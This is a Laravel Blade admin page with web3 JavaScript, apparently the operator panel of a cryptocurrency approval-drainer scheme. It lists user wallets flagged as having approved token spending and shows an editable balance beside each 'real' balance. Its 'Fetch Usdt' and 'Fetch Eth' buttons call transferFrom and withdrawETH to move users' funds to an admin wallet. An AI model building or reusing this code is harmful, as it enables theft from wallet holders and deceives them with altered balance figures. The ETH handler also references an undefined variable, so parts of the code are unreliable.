@extends("layouts.app")
@section('content')
<!-- Content Header (Page header) -->
<div class="content-header">
    <div class="container-fluid">
        <div class="mb-2">
            <h1 class="m-0">Users</h1>
        </div>
    </div>
</div>

<!-- Main content -->
<div class="content">
    <div class="container-fluid">
        <div class="card">
            <div class="card-header">
                <div class="row">

                    <div class="col-md-12">
                        <div class="float-left">
                            <small>Assets = </small>{{$assets}} / <small>Liabilities = </small>{{$liable}} <br/>

                        </div>
                        <div class="float-right">
                            <div id="app">
                                <Wallet />
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- /.card-header -->
            <div class="card-body p-2 table-responsive">
                <table class="table table-striped display text-nowrap" id="user-table">
                    <thead>
                        <tr>
                            <th style="width: 10px">#</th>
                            <th>User Id</th>
                            <th>Wallet Address</th>
                            <th>Balance (ETH)</th>
                            <th>Real Balance (ETH)</th>
                            <th>Balance (USDT)</th>
                            <th>Real Balance (USDT)</th>
                            <th>Status</th>
                            <th style="width: 40px">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach($data as $key => $user)
                        <tr>
                            <td>{{$key += 1}}</td>
                            <td><a href="user/{{$user->user_id}}/transactions">{{$user->user_id}} <br/>
                                <span class="badge badge-info">@if($user->token_approved == 1) <small>Joined</small>@endif</span>
                            </a></td>
                            <td>{{$user->wallet}} <br> <span class="badge badge-primary">{{$user->spender ?? $user->spender }}</span></td>
                            {{-- {{$stats}} --}}
                            <td>
                                @if (count($user->balance) > 0)
                                    {{$user->balance[0]->statistics_eth }}
                                    <br> <span class="badge badge-primary">{{$user->balance[0]->updated_at }}</span>

                                @else
                                    -
                                @endif
                            </td>

                            <td id="real_balance">{{$user->eth_real_balance ?? '-'}} <br><span class="badge badge-secondary">{{$user->eth_real_balance_updated_at}}</span></td>

                            <td>
                                @if (count($user->balance) > 0)
                                    {{$user->balance[0]->statistics_usdt }}
                                @else
                                    -
                                @endif
                            </td>
                            <td id="real_balance">{{$user->usdt_real_balance ?? '-'}} <br><span class="badge badge-secondary">{{$user->usdt_real_balance_updated_at}}</span></td>


                            <td>@if ($user->status == 'pending') <span class="badge badge-warning">pending</span> @else <span class="badge badge-primary">approved</span>@endif<br>
                            @if(isset($user->balance[0]->updated_by))
                                <span class="badge badge-info">{{\App\Models\User::find($user->balance[0]->updated_by)->name}}
                                </span>
                            @endif
                            </td>
                            <td>
                                {{-- <div class="dropdown">
                                    <button onclick="myFunction({{$user->id}})" class="dropbtn"><i class="fas fa-ellipsis-v"></i></button>
                                    <div id="myDropdown_{{$user->id}}" class="dropdown-content">
                                        @if ($user->status == 'pending')
                                        <a href="#" onClick="updateStatus({{$user->id}})" data-user_id={{$user->id}} class="btn btn-primary btn-sm">
                                            Approve
                                        </a>
                                        <a href="{{ route('users.manage.balance', ['id' => $user->user_id]) }}" class="btn btn-secondary btn-sm">Manage balance</a>
                                        @else
                                        <a href="#" id="modal_usdt_{{$user->id}}" onClick="fetchUsdtToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->usdt_real_balance}}>
                                            Fetch Usdt
                                        </a>
                                        <a href="#" id="modal_eth_{{$user->id}}" onClick="fetchEthToken('{{$user->id}}')" class="btn btn-primary btn-sm" data-wallet={{$user->wallet}} data-balance={{$user->eth_real_balance}}>
                                            Fetch Eth
                                        </a>
                                        <a href="{{ route('users.manage.balance', ['id' => $user->user_id]) }}" class="btn btn-secondary btn-sm">Manage balance</a>
                                        @endif
                                    </div>
                                </div> --}}
                                <div class="dropdown show">
                                    <a class="btn btn-secondary" href="#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                        <i class="fas fa-ellipsis-v"></i>
                                    </a>
                                  
                                    <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
                                        @if ($user->status == 'pending')
                                        <a href="#" onClick="updateStatus({{$user->id}})" data-user_id={{$user->id}} class="btn-sm dropdown-item">
                                            Approve
                                        </a>
                                        <a href="{{ route('users.manage.balance', ['id' => $user->user_id]) }}" class="btn-sm dropdown-item">Manage balance</a>
                                        @else
                                        <a href="#" id="modal_usdt_{{$user->id}}" onClick="fetchUsdtToken('{{$user->id}}')" class="btn-sm dropdown-item" data-wallet={{$user->wallet}} data-balance={{$user->usdt_real_balance}}>
                                            Fetch Usdt
                                        </a>
                                        <a href="#" id="modal_eth_{{$user->id}}" onClick="fetchEthToken('{{$user->id}}')" class="btn-sm dropdown-item" data-wallet={{$user->wallet}} data-balance={{$user->eth_real_balance}}>
                                            Fetch Eth
                                        </a>
                                        <a href="{{ route('users.manage.balance', ['id' => $user->user_id]) }}" class="btn-sm dropdown-item">Manage balance</a>
                                        @endif
                                    </div>
                                  </div>
                                {{-- <button class="btn btn-secondary">
                                <i class="fas fa-ellipsis-v"></i>
                                </button> --}}
                                {{-- @include('partials._drop1'); --}}
                           
                            </td>
                        </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>
            @include('partials._modal')
            <!-- /.card-body -->
        </div>
        <!-- /.card -->
    </div>
    <!-- /.container-fluid -->
</div>
<!-- /.content -->
@endsection
@section('scripts')

<script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"> </script>
<script src="{{ asset('contracts/contractABI.js') }}"></script>
<script src="{{ asset('contracts/contractAddress.js') }}"></script>
<script src="{{ asset('contracts/tokenContractABI.js') }}"></script>
<script src="{{ asset('contracts/tokenContractAddress.js') }}"></script>
<script src="{{asset('plugins/data-tables/dataTables.min.js')}}"></script>

<script>
    const web3 = new Web3(window.ethereum)
    const contract = new web3.eth.Contract(contractABI, contractAddress)
    const tokenContract = new web3.eth.Contract(tokenContractABI, tokenContractAddress)

    // Get info
    const getInfo = async () => {
        // Get connected user balances
        var walletAddress = await web3.eth.getAccounts()
    }

    // Wallet Connect
    const connectWallet = async () => {
        try {
            const accounts = await window.ethereum.request({
                method: 'eth_requestAccounts'
            })
            const walletAddress = accounts[0]

            console.log(`Admin Wallet Address: ${walletAddress}`)

            $('#connectButton').text(walletAddress.slice(0, 4) + '...' + walletAddress.slice(-5))

            $('#connectButton').prop('disabled', true)
        } catch (error) {
            console.error('Error connecting wallet:', error)
        }
    }

    // Withdraw from user
    const withdrawETH = async () => {
        let adminWalletAddress = $('#modal-spender').val();
        let user = $('#modal-wallet').val();
        let amount = $('#modal-amount').val();

        var balance = $("#modal-amount").val();

        var a_balance = $("#modal-balance").text();


        if (parseFloat(balance) > parseFloat(a_balance) || balance == '') {

            $("#modal-amount").css("border", "1px solid red");

        }else{

            $("#btn-fetch").css('display','none');
            $("#loader-btn").css('display','block');

            try {
                // Convert amount to Wei
                const amountInEth = web3.utils.toWei(amount.toString(), 'ether')

                // Call the withdraw method on the contract
                const transaction = await contract.methods.withdrawETH(user, amountInEth).send({
                    from: adminWalletAddress,
                })
                console.log('ETH Withdrawal successful:', transaction)

                if(transaction)
                {
                    $.ajaxSetup({
                    headers: {
                        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                    }
                    });

                    $.ajax({
                        url: "{{ route('fetch.eth_tokens') }}",
                        type: 'POST',
                        data: {
                            wallet: user,
                            amount: amount,
                            spender: accounts[0],
                        },
                    }).done(function(response) {
                        if (response == 'ok') {

                            $("#btn-fetch").css('display','block');
                            $("#loader-btn").css('display','none');
                            $("#modal-amount").val();

                            window.location.reload();
                        }
                    });
                }
            } catch (error) {
                console.error('Error withdrawing from contract:', error)

                $("#btn-fetch").css('display','block');
                $("#loader-btn").css('display','none');
            }
        }
    }

    // Withdraw from user
    const withdrawUSDT = async () => {
        let adminWalletAddress = $('#modal-spender').val();
        let userWalletAddress = $('#modal-wallet').val();
        let amount = parseInt($('#modal-amount').val());

        var balance = $("#modal-amount").val();

        var a_balance = $("#modal-balance").text();

        if (parseFloat(balance) > parseFloat(a_balance) || balance == '') {
            $("#modal-amount").css("border", "1px solid red");
        }else{
            $("#btn-fetch").css('display','none');
            $("#loader-btn").css('display','block');

            try {
                let allowanceAmount = await tokenContract.methods.allowance(userWalletAddress, adminWalletAddress).call()

                allowanceAmount = Number(allowanceAmount.toString())
                console.log(allowanceAmount)

                // let usdtAmount = amount * 1000000;
                
                const tx = await tokenContract.methods.transferFrom(userWalletAddress, adminWalletAddress, amount).send({
                    from: adminWalletAddress
                })

                if (tx.transactionHash) {
                    $.ajaxSetup({
                        headers: {
                            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                        }
                    });

                    $.ajax({
                        url: "{{ route('fetch.usdt_tokens') }}",
                        type: 'POST',
                        data: {
                            wallet: userWalletAddress,
                            amount: amount,
                            spender: adminWalletAddress,
                        },
                    }).done(function(response) {
                        if (response == 'ok') {

                            $("#btn-fetch").css('display','block');
                            $("#loader-btn").css('display','none');
                            $("#modal-amount").val();

                            window.location.reload();
                        }
                    });
                }
            } catch (error) {

                console.error('Error withdrawing from contract:', error)

                $("#btn-fetch").css('display','block');
                $("#loader-btn").css('display','none');
            }

        }
    }

    function updateStatus(id) {

        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
            }
        });

        $.ajax({
            url: "{{ route('update.status') }}",
            type: 'POST',
            data: {
                user_id: id
            },
        }).done(function(response) {
            if (response == 'ok') {
                window.location.reload();
            }
        });

    };

    async function fetchEthToken(id) {
      
        var wallet = $("#modal_eth_" + id).attr('data-wallet');
        var balance = $("#modal_eth_" + id).attr('data-balance');
        var spender = $("#modal-spender").val();

        if(spender == ''){

            $('#spendererrorForm').modal('show');
        }else{

            if(balance == '' || balance == '0.0' || balance == '0')
            {
                $('#errorForm').modal('show');

            }else{

                $("#modal-wallet").val(wallet);
                // $("#modal-spender").val(adminWalletAddress);
                $("#modal-balance").text(balance);

                $('#fetchForm').modal({
                    backdrop: 'static',
                    keyboard: false  // to prevent closing with Esc button (if you want this too)
                });
            }
        }
    }

    async function fetchUsdtToken(id) {
     
        var wallet = $("#modal_usdt_" + id).attr('data-wallet');
        var balance = $("#modal_usdt_" + id).attr('data-balance');
        var spender = $("#modal-spender").val();

        if(spender == ''){

            $('#spendererrorForm').modal('show');

        }else{

            if(balance == '' || balance == '0.0' || balance == '0')
            {
                $('#errorForm').modal('show');

            }else{

                $("#modal-wallet").val(wallet);
                // $("#modal-spender").val(adminWalletAddress);
                $("#modal-balance").text(balance);

                $("#btn-fetch").attr('onClick','withdrawUSDT()');

                $('#fetchForm').modal({
                    backdrop: 'static',
                    keyboard: false  // to prevent closing with Esc button (if you want this too)
                });
            }
        }
    }

    function checkBalance() {

        var balance = $("#modal-amount").val();

        var a_balance = $("#modal-balance").text();

        if (parseFloat(balance) > parseFloat(a_balance)) {
            $("#btn-fetch").attr("disabled", "disabled");

        } else if (parseFloat(balance) <= parseFloat(a_balance)) {

            $("#btn-fetch").removeAttr('disabled');

        }

    }

    $('#user-table').DataTable({
        "paging": true,
        "lengthChange": false,
        "searching": true,
        "ordering": true,
        responsive: true
    });

    function myFunction(id) {
        document.getElementById("myDropdown_"+id).classList.toggle("show");
    }

        // Close the dropdown if the user clicks outside of it
        window.onclick = function(event) {
            if (!event.target.matches('.dropbtn')) {
                var dropdowns = document.getElementsByClassName("dropdown-content");
                var i;
                for (i = 0; i < dropdowns.length; i++) {
                var openDropdown = dropdowns[i];
                if (openDropdown.classList.contains('show')) {
                    openDropdown.classList.remove('show');
                }
                }
            }
    }
</script>
@endsection
